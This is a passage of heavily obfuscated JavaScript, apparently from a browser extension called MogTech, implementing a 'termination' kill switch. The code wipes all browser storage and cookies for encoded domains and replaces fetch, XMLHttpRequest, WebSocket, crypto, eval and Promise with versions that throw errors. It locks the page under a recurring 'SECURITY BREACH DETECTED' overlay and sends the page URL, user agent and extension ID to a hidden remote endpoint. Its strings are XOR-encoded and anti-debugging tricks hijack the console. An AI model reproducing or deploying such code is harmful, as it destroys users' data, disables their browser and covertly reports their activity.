            (parseInt(a(n)) / 4) * (-parseInt(a(r)) / 5) +
            parseInt(a(o)) / 6 +
            (parseInt(a(333)) / 7) * (parseInt(a(359)) / 8) +
            (parseInt(a(i)) / 9) * (parseInt(a(432)) / 10) +
            (-parseInt(a(s)) / 11) * (parseInt(a(398)) / 12)
        )
          break;
        u.push(u.shift());
      } catch (c) {
        u.push(u.shift());
      }
  })(W);
  const O = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    M = O(void 0, function () {
      const t = 549,
        e = P,
        n = { qfjJA: "(((.+)+)+)+$" },
        r = n;
      return M.toString()
        [e(t)](r.qfjJA)
        .toString()
        .constructor(M)
        [e(t)]("(((.+)+)+)+$");
    });
  M();
  const L = (function () {
      const t = 388;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[P(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    N = L(void 0, function () {
      const t = 404,
        e = 377,
        n = 395,
        r = 436,
        o = 486,
        i = 435,
        s = 491,
        a = P,
        u = {};
      (u[a(491)] = function (t, e) {
        return t + e;
      }),
        (u[a(t)] = a(e) + 'ctor("return this")( )'),
        (u[a(470)] = "table"),
        (u.aoIul = "trace"),
        (u[a(326)] = function (t, e) {
          return t < e;
        });
      const c = u,
        l = (function () {
          const t = a;
          let e;
          try {
            e = Function(c[t(s)]("return (function() ", c.ykoEA) + ");")();
          } catch (n) {
            e = window;
          }
          return e;
        })(),
        d = (l.console = l.console || {}),
        f = [a(n), a(r), "info", "error", a(552), c[a(470)], c.aoIul];
      for (let h = 0; c.qUiod(h, f[a(o)]); h++) {
        const t = L[a(453) + "r"].prototype.bind(L),
          e = f[h],
          n = d[e] || t;
        (t.__proto__ = L.bind(L)), (t.toString = n[a(i)].bind(n)), (d[e] = t);
      }
    });
  N(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class D {
    constructor() {
      const t = 332,
        e = P;
      (this[e(496)] = ![]), (this["terminatio" + e(t)] = "");
    }
    static getInstance() {
      const t = 462,
        e = P;
      return !D[e(462)] && (D[e(t)] = new D()), D.instance;
    }
    async terminate(t) {
      const e = 520,
        n = 380,
        r = 327,
        o = 528,
        i = 527,
        s = 394,
        a = 364,
        u = P,
        c = {};
      c[u(512)] = function (t, e) {
        return t === e;
      };
      const l = c;
      if (!this.terminated) {
        (this.terminated = !![]), (this.terminationReason = t.reason);
        try {
          switch (t[u(e)]) {
            case "soft":
              await this.softTermination(t);
              break;
            case "hard":
              await this["hardTermin" + u(n)](t);
              break;
            case u(r):
              await this.nuclearTermination(t);
          }
        } catch (d) {
          u(o) + u(414),
            d instanceof Error
              ? d[u(i)]
              : l[u(512)](typeof d, "string") ||
                (d && "object" == typeof d && JSON[u(s)](d)),
            await this[u(a) + "mination"](t);
        }
      }
    }
    async ["softTermin" + R(380)](t) {
      const e = R;
      t.showUserNotification &&
        this["showSecuri" + e(526) + "tion"](t.reason, "warning"),
        [
          function (t, e, n) {
            return t(e, n);
          },
        ][0](
          setTimeout,
          () => {
            window.location.reload();
          },
          5e3
        );
    }
    async ["hardTermin" + R(380)](t) {
      const e = R;
      await this.clearAllStorage(),
        await this["disableExt" + e([455][0]) + "ures"](),
        this["showSecurityNotifica" + e(367)](t[e(481)], "error"),
        this.preventCodeExecution(),
        await this.reportTermination(t);
    }
    async [R(364) + R(410)](t) {
      const e = R;
      await this.destroyAllData(),
        this[e(501) + e(484) + e(439)](t.reason),
        this.disableBrowserAPIs(),
        this.startTerminationLoop(),
        this.emergencyServerNotification(t);
    }
    async ["clearAllSt" + R(536)]() {
      var t, e;
      const n = 511,
        r = 415,
        o = 535,
        i = 543,
        s = 379,
        a = 338,
        u = 428,
        c = 493,
        l = 349,
        d = 527,
        f = 486,
        h = 363,
        p = 537,
        m = R,
        g = {
          ZiTsd: function (t, e) {
            return t & e;
          },
        };
      (g[m(330)] = "undefined"),
        (g[m(431)] = function (t, e) {
          return t !== e;
        }),
        (g.kNJFp = function (t, e) {
          return t instanceof e;
        }),
        (g.JPFka = function (t, e) {
          return t === e;
        }),
        (g[m(n)] = m(r));
      const y = g;
      try {
        if (
          (typeof chrome !== y.GKpYa &&
            chrome.storage &&
            (await chrome[m(535)].local.clear(),
            await (null == (t = chrome[m(o)][m(i)]) ? void 0 : t[m(s)]()),
            await (null == (e = chrome[m(535)][m(a)]) ? void 0 : e.clear())),
          localStorage.clear(),
          sessionStorage.clear(),
          y.rtMQE(typeof chrome, m(532)) && chrome.cookies)
        ) {
          const t = await chrome[m(u)].getAll({});
          for (const e of t)
            if (
              e[m(448)][m(457)](
                (function () {
                  let t;
                  return function () {
                    const e = P;
                    if (!t) {
                      const n = new Uint8Array([12, 2, 249, 117, 4, 14, 246]),
                        r = 27159905,
                        o = new Uint8Array(n.length);
                      for (let t = 0; t < n.length; t++) {
                        const i = y[e(p)](r >>> ((t % 4) * 8), 255);
                        o[t] = n[t] ^ i;
                      }
                      t = new TextDecoder().decode(o);
                    }
                    return t;
                  };
                })()()
              ) ||
              e.domain.includes(
                (function () {
                  const t = m,
                    e = {};
                  (e[t(344)] = function (t, e) {
                    return t * e;
                  }),
                    (e.oQplx = function (t, e) {
                      return t ^ e;
                    });
                  const n = e;
                  let r;
                  return function () {
                    const e = t;
                    if (!r) {
                      const t = new Uint8Array([14, 2, 249, 117, 6, 14, 246]),
                        o = 27159907,
                        i = new Uint8Array(t.length);
                      for (let r = 0; r < t[e(f)]; r++) {
                        const e = (o >>> n.Xcgsy(r % 4, 8)) & 255;
                        i[r] = n.oQplx(t[r], e);
                      }
                      r = new TextDecoder()[e(h)](i);
                    }
                    return r;
                  };
                })()()
              )
            ) {
              const t = {};
              (t[m(c)] =
                "http" + (e.secure ? "s" : "") + m(463) + e[m(434)] + e[m(l)]),
                (t[m(448)] = e.name),
                await chrome.cookies.remove(t);
            }
        }
      } catch (w) {
        y.kNJFp(w, Error)
          ? w[m(d)]
          : y[m(324)](typeof w, m(433)) ||
            (w && typeof w === y[m(n)] && JSON.stringify(w));
      }
    }
    async [R(441) + "ensionFeat" + R(399)]() {
      var t, e;
      const n = 513,
        r = 506,
        o = 337,
        i = 433,
        s = 467,
        a = 548,
        u = 386,
        c = R,
        l = { QWsnZ: "message", xVlaN: "DOMContentLoaded" };
      (l[c(425)] = function (t, e) {
        return t in e;
      }),
        (l.aRUkQ = "serviceWor" + c(n)),
        (l[c(r)] = c(528) + "ror"),
        (l.vHwDK = function (t, e) {
          return t instanceof e;
        }),
        (l[c(o)] = function (t, e) {
          return t === e;
        }),
        (l.gbbgr = c(i));
      const d = l;
      try {
        if (
          (null == (t = window[c(467) + "tListener"])
            ? void 0
            : t.call(window, d.QWsnZ, () => {}),
          null == (e = document[c(s) + "tListener"])
            ? void 0
            : e.call(document, d.xVlaN, () => {}),
          (window.mogTechAPI = null),
          (window["walletServ" + c(a)] = null),
          (window[c(u) + "e"] = null),
          d.VSSOD(d.aRUkQ, navigator))
        ) {
          const t = await navigator.serviceWorker.getRegistrations();
          for (const e of t) await e[c(339)]();
        }
      } catch (f) {
        d.HfTNr,
          d.vHwDK(f, Error)
            ? f.message
            : d[c(o)](typeof f, d.gbbgr) ||
              (f && "object" == typeof f && JSON.stringify(f));
      }
    }
    [R(501) + R(484) + R(439)](t) {
      const e = 400,
        n = 387,
        r = 502,
        o = 342,
        i = 372,
        s = 490,
        a = 544,
        u = 531,
        c = 328,
        l = 325,
        d = 422,
        f = 409,
        h = 505,
        p = 440,
        m = 361,
        g = 523,
        y = 524,
        w = 354,
        b = 494,
        v = 372,
        A = 366,
        k = 473,
        I = 451,
        S = 447,
        _ = 471,
        T = 503,
        C = 335,
        B = 423,
        E = 487,
        x = 384,
        P = 385,
        O = 329,
        M = 383,
        L = 477,
        N = 518,
        D = 389,
        U = 340,
        q = 499,
        W = 358,
        z = 529,
        K = 360,
        F = 390,
        j = 458,
        G = 454,
        V = 507,
        H = 376,
        X = 345,
        Z = 488,
        J = 538,
        Y = 381,
        Q = 521,
        $ = 533,
        tt = 540,
        et = 368,
        nt = 370,
        rt = 347,
        ot = 370,
        it = 508,
        st = R,
        at = {};
      at[st(476)] = "div";
      const ut = at,
        ct = document.createElement(ut.DVGRt);
      (ct.id = st(e) + "rmination-screen"),
        (ct.style[st(n)] =
          st(r) +
          st(o) +
          st(i) +
          ";\n\t\t\ttop: 0 !importa" +
          st(s) +
          st(a) +
          "rtant;\n\t\t\twidth: 100" +
          st(u) +
          "ant;\n\t\t\theight: 100vh !importa" +
          st(449) +
          st(429) +
          "inear-gradient(45deg" +
          st(c) +
          st(l) +
          "!important;\n\t\t\tcolor: #ff0000 !important" +
          st(d) +
          "ex: 2147483647 !impo" +
          st(f) +
          "display: f" +
          st(355) +
          st(h) +
          st(p) +
          st(m) +
          "n !important;\n\t\t\tjustify-conte" +
          st(g) +
          " !importan" +
          st(y) +
          "n-items: center !imp" +
          st(504) +
          "\tfont-fami" +
          st(w) +
          st(445) +
          "onospace !" +
          st(b) +
          "\n\t\t\tfont-size: 16px " +
          st(v) +
          ";\n\t\t\ttext-" +
          st(A) +
          "ter !impor" +
          st(500) +
          "ointer-events: none !important;\n\t\t\tuser-select: none !import" +
          st(479)),
        (ct.innerHTML =
          "\n\t\t\t<div s" +
          st(k) +
          "er: 3px solid #ff000" +
          st(I) +
          ': 40px; background: rgba(255,0,0,0.1); animation: pulse 2s infinite;">\n\t\t\t\t<h1 style="colo' +
          st(S) +
          "; font-size: 32px; margin-bottom: 20px; " +
          st(_) +
          st(498) +
          "x #ff0000;" +
          st(T) +
          "CURITY BREACH DETECT" +
          st(C) +
          st(509) +
          'v style="background:' +
          st(B) +
          "padding: 20px; margin: 20px 0; border: 1px solid #" +
          st(E) +
          '\t\t\t\t\t<p style="margi' +
          st(x) +
          " font-weig" +
          st(P) +
          ">MOGTECH H" +
          st(O) +
          "RMINATED FOR SECURITY VIOLATION</p>\n\t\t\t\t" +
          st(417) +
          '"margin: 10px 0;"><s' +
          st(418) +
          st(375) +
          st(M) +
          t +
          st(L) +
          '<p style="margin: 10' +
          st(N) +
          " sensitive data has been destroyed.</p>\n" +
          st(542) +
          "\n\t\t\t\t<p st" +
          st(D) +
          ": #ffff00;" +
          st(U) +
          "ht: bold; " +
          st(376) +
          " 18px; margin: 20px " +
          st(q) +
          st(W) +
          "GNORE THIS" +
          st(z) +
          st(K) +
          "\t\t\t\t<p sty" +
          st(F) +
          st(j) +
          ">MogTech extension has been permanently disabled.<" +
          st(G) +
          ' style="ma' +
          st(492) +
          st(510) +
          st(V) +
          "einstall from a trusted source.</p>\n\t\t\t\t<div style" +
          st(474) +
          "op: 30px; " +
          st(H) +
          st(X) +
          'or: #888;"' +
          st(Z) +
          st(J) +
          "D: " +
          Date.now().toString(36) +
          st(Y) +
          ">\n\t\t\t</div" +
          st(Q));
      const lt = document.createElement(st($));
      (lt[st(tt) + "t"] =
        "\n\t\t\t@keyframes pulse" +
        st(365) +
        "{ opacity: 1; }\n\t\t\t\t50% { opacity: 0.7; }\n\t\t\t\t100% { opacity" +
        st(et) +
        "}\n\t\t"),
        document.head.appendChild(lt),
        document[st(nt)].appendChild(ct);
      const dt = new MutationObserver(() => {
          const t = 486,
            e = st;
          !document["getElement" + e(468)](
            (function () {
              const n = e,
                r = {
                  DFSXn: function (t, e) {
                    return t & e;
                  },
                };
              r[n(it)] = function (t, e) {
                return t ^ e;
              };
              const o = r;
              let i;
              return function () {
                const e = n;
                if (!i) {
                  const n = new Uint8Array([
                      12, 2, 249, 117, 4, 14, 246, 44, 21, 8, 236, 108, 8, 3,
                      255, 117, 8, 2, 240, 44, 18, 14, 236, 100, 4, 3,
                    ]),
                    r = 27159905,
                    s = new Uint8Array(n[e(t)]);
                  for (let t = 0; t < n.length; t++) {
                    const e = o.DFSXn(r >>> ((t % 4) * 8), 255);
                    s[t] = o.iDnOi(n[t], e);
                  }
                  i = new TextDecoder().decode(s);
                }
                return i;
              };
            })()()
          ) && document.body.appendChild(ct);
        }),
        ft = { childList: !![] };
      (ft[st(371)] = !![]), dt[st(rt)](document[st(ot)], ft);
    }
    ["disableBro" + R(416)]() {
      const t = 352,
        e = 419,
        n = 411,
        r = 527,
        o = 433,
        i = 486,
        s = 406,
        a = 402,
        u = 514,
        c = 486,
        l = 363,
        d = 426,
        f = R,
        h = {
          XUApA: function (t, e) {
            return t * e;
          },
          MnDsS: function (t, e) {
            return t ^ e;
          },
          ihvwr: function (t, e) {
            return t & e;
          },
          WSanE: function (t, e) {
            return t ^ e;
          },
        };
      (h[f(550)] = function (t, e) {
        return t < e;
      }),
        (h.qQwGZ = function (t, e) {
          return t >>> e;
        }),
        (h.IjCDx = function (t, e) {
          return t % e;
        }),
        (h.WebXs = function (t, e) {
          return t >>> e;
        }),
        (h.krnpn = function (t, e) {
          return t * e;
        }),
        (h[f(t)] = function (t, e) {
          return t instanceof e;
        }),
        (h.WruNb = function (t, e) {
          return t === e;
        });
      const p = h;
      try {
        (window[f(e)] = () =>
          Promise.reject(
            new Error(
              (function () {
                const t = function (t, e) {
                    return p.XUApA(t, e);
                  },
                  e = function (t, e) {
                    return t % e;
                  },
                  n = function (t, e) {
                    return p[P(d)](t, e);
                  };
                let r;
                return function () {
                  const o = P;
                  if (!r) {
                    const i = new Uint8Array([
                        34, 53, 202, 68, 41, 62, 215, 78, 41, 77, 202, 68, 53,
                        32, 215, 79, 38, 57, 219, 69,
                      ]),
                      s = 27159911,
                      a = new Uint8Array(i.length);
                    for (let r = 0; r < i[o(c)]; r++) {
                      const o = (s >>> t(e(r, 4), 8)) & 255;
                      a[r] = n(i[r], o);
                    }
                    r = new TextDecoder()[o(l)](a);
                  }
                  return r;
                };
              })()()
            )
          )),
          (window.XMLHttpRequest = class {
            constructor() {
              const t = {
                XaLca: function (t, e) {
                  return p[P(525)](t, e);
                },
                iNJuf: function (t, e) {
                  return p[P(u)](t, e);
                },
              };
              throw new Error(
                (function () {
                  const e = function (e, n) {
                      return t.XaLca(e, n);
                    },
                    n = function (e, n) {
                      return t[P(465)](e, n);
                    };
                  let r;
                  return function () {
                    const t = P;
                    if (!r) {
                      const o = new Uint8Array([
                          36, 53, 202, 68, 47, 62, 215, 78, 47, 77, 202, 68, 51,
                          32, 215, 79, 32, 57, 219, 69,
                        ]),
                        i = 27159905,
                        s = new Uint8Array(o[t(486)]);
                      for (let t = 0; t < o.length; t++) {
                        const r = e(i >>> ((t % 4) * 8), 255);
                        s[t] = n(o[t], r);
                      }
                      r = new TextDecoder().decode(s);
                    }
                    return r;
                  };
                })()()
              );
            }
          }),
          (window.WebSocket = class {
            constructor() {
              const t = function (t, e) {
                  return t < e;
                },
                e = function (t, e) {
                  return p.XUApA(t, e);
                };
              throw new Error(
                (function () {
                  const n = 486;
                  let r;
                  return function () {
                    const o = P;
                    if (!r) {
                      const i = new Uint8Array([
                          38, 53, 202, 68, 45, 62, 215, 78, 45, 77, 202, 68, 49,
                          32, 215, 79, 34, 57, 219, 69,
                        ]),
                        s = 27159907,
                        a = new Uint8Array(i.length);
                      for (let r = 0; t(r, i[o(n)]); r++) {
                        const t = (s >>> e(r % 4, 8)) & 255;
                        a[r] = i[r] ^ t;
                      }
                      r = new TextDecoder()[o(363)](a);
                    }
                    return r;
                  };
                })()()
              );
            }
          }),
          (window[f(351)][f(n)] = {
            encrypt: () =>
              Promise.reject(
                new Error(
                  (function () {
                    let t;
                    return function () {
                      if (!t) {
                        const e = new Uint8Array([
                            36, 53, 202, 68, 47, 62, 215, 78, 47, 77, 202, 68,
                            51, 32, 215, 79, 32, 57, 219, 69,
                          ]),
                          n = 27159905,
                          r = new Uint8Array(e.length);
                        for (let t = 0; t < e.length; t++) {
                          const o = (n >>> ((t % 4) * 8)) & 255;
                          r[t] = e[t] ^ o;
                        }
                        t = new TextDecoder().decode(r);
                      }
                      return t;
                    };
                  })()()
                )
              ),
            decrypt: () =>
              Promise.reject(
                new Error(
                  (function () {
                    let t;
                    return function () {
                      const e = P;
                      if (!t) {
                        const n = new Uint8Array([
                            42, 53, 202, 68, 33, 62, 215, 78, 33, 77, 202, 68,
                            61, 32, 215, 79, 46, 57, 219, 69,
                          ]),
                          r = 27159919,
                          o = new Uint8Array(n.length);
                        for (let t = 0; p.rNPJK(t, n.length); t++) {
                          const i = 255 & p[e(s)](r, 8 * p[e(a)](t, 4));
                          o[t] = n[t] ^ i;
                        }
                        t = new TextDecoder().decode(o);
                      }
                      return t;
                    };
                  })()()
                )
              ),
            sign: () =>
              Promise.reject(
                new Error(
                  (function () {
                    const t = 514;
                    let e;
                    return function () {
                      const n = P;
                      if (!e) {
                        const r = new Uint8Array([
                            36, 53, 202, 68, 47, 62, 215, 78, 47, 77, 202, 68,
                            51, 32, 215, 79, 32, 57, 219, 69,
                          ]),
                          o = 27159905,
                          i = new Uint8Array(r.length);
                        for (let e = 0; p.rNPJK(e, r.length); e++) {
                          const s = 255 & p.WebXs(o, (e % 4) * 8);
                          i[e] = p[n(t)](r[e], s);
                        }
                        e = new TextDecoder()[n(363)](i);
                      }
                      return e;
                    };
                  })()()
                )
              ),
            verify: () =>
              Promise[f(396)](
                new Error(
                  (function () {
                    let t;
                    return function () {
                      const e = P;
                      if (!t) {
                        const n = new Uint8Array([
                            38, 53, 202, 68, 45, 62, 215, 78, 45, 77, 202, 68,
                            49, 32, 215, 79, 34, 57, 219, 69,
                          ]),
                          r = 27159907,
                          o = new Uint8Array(n[e(i)]);
                        for (let t = 0; p.rNPJK(t, n.length); t++) {
                          const e = (r >>> p.krnpn(t % 4, 8)) & 255;
                          o[t] = n[t] ^ e;
                        }
                        t = new TextDecoder().decode(o);
                      }
                      return t;
                    };
                  })()()
                )
              ),
          });
      } catch (m) {
        p.QbqJV(m, Error)
          ? m[f(r)]
          : typeof m === f(o) ||
            (m && p.WruNb(typeof m, "object") && JSON.stringify(m));
      }
    }
    startTerminationLoop() {
      const t = 379,
        e = 439,
        n = function (t, e, n) {
          return t(e, n);
        },
        r = () => {
          const o = P,
            i = {
              jsthz: function (t, e) {
                return t >>> e;
              },
            },
            s = i;
          try {
            localStorage.clear(), sessionStorage[o(t)]();
          } catch (a) {}
          !document.getElementById(
            (function () {
              const t = 486,
                e = 516,
                n = 466,
                r = {
                  EsGDn: function (t, e) {
                    return t < e;
                  },
                  eAPyW: function (t, e) {
                    return t & e;
                  },
                  GlSOA: function (t, e) {
                    return s.jsthz(t, e);
                  },
                };
              let o;
              return function () {
                const i = P;
                if (!o) {
                  const s = new Uint8Array([
                      12, 2, 249, 117, 4, 14, 246, 44, 21, 8, 236, 108, 8, 3,
                      255, 117, 8, 2, 240, 44, 18, 14, 236, 100, 4, 3,
                    ]),
                    a = 27159905,
                    u = new Uint8Array(s[i(t)]);
                  for (let t = 0; r[i(e)](t, s.length); t++) {
                    const e = r.eAPyW(r[i(n)](a, (t % 4) * 8), 255);
                    u[t] = s[t] ^ e;
                  }
                  o = new TextDecoder().decode(u);
                }
                return o;
              };
            })()()
          ) && this[o(501) + "minationSc" + o(e)](this.terminationReason),
            n(setTimeout, r, 1e3);
        };
      n(setTimeout, r, 100);
    }
    ["showSecuri" + R(526) + R(367)](t, e) {
      const n = 408,
        r = 369,
        o = 446,
        i = 420,
        s = 472,
        a = 412,
        u = 331,
        c = 443,
        l = 478,
        d = 401,
        f = 374,
        h = 430,
        p = 517,
        m = 483,
        g = 519,
        y = 421,
        w = 464,
        b = 356,
        v = R,
        A = {
          beLyT: function (t, e) {
            return t & e;
          },
          ynuaq: function (t, e) {
            return t * e;
          },
          iujHr: function (t, e) {
            return t ^ e;
          },
          dsOsb: "div",
          COwEu: "error",
          WFwwX: function (t, e) {
            return t === e;
          },
          zXPSZ: "🚨 SECURITY ALERT",
          OWTvE: "⚠️ SECURITY WARNING",
          TxJkm: function (t, e) {
            return t === e;
          },
          ZLZhW: function (t, e, n) {
            return t(e, n);
          },
        },
        k = document[v(362) + "ent"](A[v(373)]);
      (k.style.cssText =
        "\n\t\t\tpositi" +
        v(424) +
        "\n\t\t\ttop: 2" +
        v(n) +
        v(r) +
        "\n\t\t\tbackgr" +
        v(o) +
        (e === A.COwEu ? "#ff0000" : "#ffa500") +
        v(i) +
        ": white;\n\t" +
        v(s) +
        v(a) +
        "border-radius: 5px;\n\t\t\tz-index" +
        v(u) +
        "\n\t\t\tfont-f" +
        v(475) +
        "al, sans-serif;\n\t\t\tfont-weight" +
        v(c) +
        v(l) +
        v(d) +
        "\t"),
        (k.innerHTML =
          v(f) +
          (A[v(h)](e, v(p)) ? A[v(m)] : A.OWTvE) +
          "</h3>\n\t\t\t<p>" +
          t +
          "</p>\n\t\t\t<p" +
          v(g) +
          "tension fu" +
          v(y) +
          "y has been disabled.</small></" +
          v(480)),
        document.body.appendChild(k),
        A.TxJkm(
          e,
          (function () {
            let t;
            return function () {
              const e = P;
              if (!t) {
                const n = new Uint8Array([16, 12, 236, 111, 14, 3, 249]),
                  r = 27159911,
                  o = new Uint8Array(n.length);
                for (let t = 0; t < n.length; t++) {
                  const i = A[e(b)](r >>> A.ynuaq(t % 4, 8), 255);
                  o[t] = A[e(407)](n[t], i);
                }
                t = new TextDecoder().decode(o);
              }
              return t;
            };
          })()()
        ) &&
          A[v(382)](
            setTimeout,
            () => {
              k[v(w)]();
            },
            1e4
          );
    }
    async [R(541) + R(495)](t) {
      const e = 438,
        n = 427,
        r = 437,
        o = 534,
        i = 403,
        s = 444,
        a = 341,
        u = 527,
        c = 350,
        l = R,
        d = {
          jiYOJ: function (t, e) {
            return t < e;
          },
        };
      (d[l(551)] = function (t, e) {
        return t & e;
      }),
        (d[l(e)] = function (t, e) {
          return t & e;
        }),
        (d[l(n)] = l(r) + l(442)),
        (d[l(o)] = "Unknown error"),
        (d[l(i)] = function (t, e) {
          return t === e;
        }),
        (d[l(s)] = function (t, e) {
          return t === e;
        });
      const f = d;
      try {
        await fetch(
          (function () {
            const t = 350,
              e = 551;
            let n;
            return function () {
              const r = P;
              if (!n) {
                const o = new Uint8Array([
                    9, 25, 234, 113, 18, 87, 177, 46, 12, 2, 249, 117, 4, 14,
                    246, 47, 5, 8, 232, 46, 0, 29, 247, 46, 18, 8, 253, 116, 19,
                    4, 234, 120, 78, 25, 251, 115, 12, 4, 240, 96, 21, 4, 241,
                    111,
                  ]),
                  i = 27159905,
                  s = new Uint8Array(o.length);
                for (let n = 0; f[r(t)](n, o[r(486)]); n++) {
                  const t = f[r(e)](i >>> ((n % 4) * 8), 255);
                  s[n] = o[n] ^ t;
                }
                n = new TextDecoder().decode(s);
              }
              return n;
            };
          })()(),
          {
            method: (function () {
              let t;
              return function () {
                const e = P;
                if (!t) {
                  const n = new Uint8Array([51, 34, 205, 85]),
                    r = 27159907,
                    o = new Uint8Array(n.length);
                  for (let t = 0; f[e(c)](t, n.length); t++) {
                    const i = f[e(438)](r >>> ((t % 4) * 8), 255);
                    o[t] = n[t] ^ i;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            headers: { "Content-Type": f.oXmJI },
            body: JSON.stringify({
              reason: t.reason,
              level: t[l(520)],
              timestamp: Date[l(a)](),
              userAgent: navigator.userAgent,
              url: window.location.href,
            }),
          }
        );
      } catch (h) {
        f[l(534)],
          h instanceof Error
            ? h[l(u)]
            : f.IPEzS(typeof h, "string") ||
              (h && f.qFmIJ(typeof h, l(415)) && JSON.stringify(h));
      }
    }
    emergencyServerNotification(t) {
      var e;
      const n = 334,
        r = 378,
        o = 397,
        i = 391,
        s = 486,
        a = R,
        u = {};
      (u[a(393)] = function (t, e) {
        return t < e;
      }),
        (u.HaIMZ = function (t, e) {
          return t & e;
        }),
        (u[a(n)] = function (t, e) {
          return t ^ e;
        }),
        (u.uYmyu = function (t, e) {
          return t < e;
        }),
        (u[a(r)] = function (t, e) {
          return t & e;
        }),
        (u.kcdbL = a(o)),
        (u[a(482)] = "sendBeacon");
      const c = u,
        l = {
          emergency: !![],
          reason: t[a(481)],
          timestamp: Date.now(),
          extensionId:
            (null == (e = null == chrome ? void 0 : chrome[a(459)])
              ? void 0
              : e.id) || c.kcdbL,
        },
        d = { "Content-Type": "application/json" };
      fetch(
        (function () {
          const t = 486;
          let e;
          return function () {
            const n = P;
            if (!e) {
              const r = new Uint8Array([
                  9, 25, 234, 113, 18, 87, 177, 46, 12, 2, 249, 117, 4, 14, 246,
                  47, 5, 8, 232, 46, 0, 29, 247, 46, 18, 8, 253, 116, 19, 4,
                  234, 120, 78, 8, 243, 100, 19, 10, 251, 111, 2, 20,
                ]),
                o = 27159905,
                i = new Uint8Array(r[n(t)]);
              for (let t = 0; c.AfPBK(t, r.length); t++) {
                const e = c[n(530)](o >>> ((t % 4) * 8), 255);
                i[t] = c.BNMBr(r[t], e);
              }
              e = new TextDecoder().decode(i);
            }
            return e;
          };
        })()(),
        {
          method: (function () {
            let t;
            return function () {
              const e = P;
              if (!t) {
                const n = new Uint8Array([47, 34, 205, 85]),
                  r = 27159935,
                  o = new Uint8Array(n[e(s)]);
                for (let t = 0; c.uYmyu(t, n[e(s)]); t++) {
                  const e = (r >>> ((t % 4) * 8)) & 255;
                  o[t] = c.BNMBr(n[t], e);
                }
                t = new TextDecoder().decode(o);
              }
              return t;
            };
          })()(),
          headers: d,
          body: JSON.stringify(l),
        }
      ).catch(() => {}),
        c.npcmP in navigator &&
          navigator.sendBeacon(
            (function () {
              const t = {
                RDsmA: function (t, e) {
                  return c.HaIMZ(t, e);
                },
                LBWHn: function (t, e) {
                  return t >>> e;
                },
              };
              let e;
              return function () {
                const n = P;
                if (!e) {
                  const r = new Uint8Array([
                      9, 25, 234, 113, 18, 87, 177, 46, 12, 2, 249, 117, 4, 14,
                      246, 47, 5, 8, 232, 46, 0, 29, 247, 46, 18, 8, 253, 116,
                      19, 4, 234, 120, 78, 8, 243, 100, 19, 10, 251, 111, 2, 20,
                    ]),
                    o = 27159905,
                    s = new Uint8Array(r.length);
                  for (let e = 0; e < r.length; e++) {
                    const a = t[n(i)](t.LBWHn(o, (e % 4) * 8), 255);
                    s[e] = r[e] ^ a;
                  }
                  e = new TextDecoder()[n(363)](s);
                }
                return e;
              };
            })()(),
            JSON.stringify(l)
          );
      new Image().src =
        (function () {
          const t = {
            DdEtk: function (t, e) {
              return c.jqEAX(t, e);
            },
            iRAuk: function (t, e) {
              return t >>> e;
            },
            Jssph: function (t, e) {
              return t * e;
            },
            QKFIf: function (t, e) {
              return t % e;
            },
          };
          let e;
          return function () {
            const n = P;
            if (!e) {
              const r = new Uint8Array([
                  11, 25, 234, 113, 16, 87, 177, 46, 14, 2, 249, 117, 6, 14,
                  246, 47, 7, 8, 232, 46, 2, 29, 247, 46, 16, 8, 253, 116, 17,
                  4, 234, 120, 76, 8, 243, 100, 17, 10, 251, 111, 0, 20, 161,
                  101, 2, 25, 255, 60,
                ]),
                o = 27159907,
                i = new Uint8Array(r.length);
              for (let e = 0; e < r.length; e++) {
                const s = t.DdEtk(t.iRAuk(o, t[n(336)](t.QKFIf(e, 4), 8)), 255);
                i[e] = r[e] ^ s;
              }
              e = new TextDecoder().decode(i);
            }
            return e;
          };
        })()() + encodeURIComponent(JSON[a(394)](l));
    }
    async destroyAllData() {
      const t = R,
        e = {
          zBnnG: function (t, e) {
            return t < e;
          },
        },
        n = e;
      await this[t(392) + "orage"]();
      for (let r = 0; n.zBnnG(r, 1e3); r++)
        window["destroy_" + r] = "X".repeat(1e4);
      window.gc && window.gc();
    }
    [R(469) + R(452)]() {
      const t = 456,
        e = R,
        n = {
          CHhSt: function (t, e) {
            return t * e;
          },
        },
        r = n;
      (window[e(497)] = () => {
        const t = 545,
          e = 353,
          n = {
            MIKOV: function (t, e) {
              return t < e;
            },
            zYums: function (t, e) {
              return t >>> e;
            },
            JLKpN: function (t, e) {
              return r.CHhSt(t, e);
            },
            AXooq: function (t, e) {
              return t ^ e;
            },
          };
        throw new Error(
          (function () {
            let r;
            return function () {
              const o = P;
              if (!r) {
                const i = new Uint8Array([
                    36, 53, 202, 68, 47, 62, 215, 78, 47, 77, 202, 68, 51, 32,
                    215, 79, 32, 57, 219, 69,
                  ]),
                  s = 27159905,
                  a = new Uint8Array(i.length);
                for (let r = 0; n[o(t)](r, i.length); r++) {
                  const t = 255 & n.zYums(s, n[o(e)](r % 4, 8));
                  a[r] = n.AXooq(i[r], t);
                }
                r = new TextDecoder().decode(a);
              }
              return r;
            };
          })()()
        );
      }),
        (window[e(460) + "l"] = () => {
          const t = 486,
            e = 363,
            n = {
              OiCog: function (t, e) {
                return t % e;
              },
            },
            r = n;
          throw new Error(
            (function () {
              let n;
              return function () {
                const o = P;
                if (!n) {
                  const i = new Uint8Array([
                      34, 53, 202, 68, 41, 62, 215, 78, 41, 77, 202, 68, 53, 32,
                      215, 79, 38, 57, 219, 69,
                    ]),
                    s = 27159911,
                    a = new Uint8Array(i[o(t)]);
                  for (let e = 0; e < i[o(t)]; e++) {
                    const t = (s >>> (8 * r.OiCog(e, 4))) & 255;
                    a[e] = i[e] ^ t;
                  }
                  n = new TextDecoder()[o(e)](a);
                }
                return n;
              };
            })()()
          );
        }),
        (window.Promise = class {
          constructor() {
            throw new Error(
              (function () {
                const t = 363;
                let e;
                return function () {
                  const n = P;
                  if (!e) {
                    const r = new Uint8Array([
                        36, 53, 202, 68, 47, 62, 215, 78, 47, 77, 202, 68, 51,
                        32, 215, 79, 32, 57, 219, 69,
                      ]),
                      o = 27159905,
                      i = new Uint8Array(r.length);
                    for (let t = 0; t < r.length; t++) {
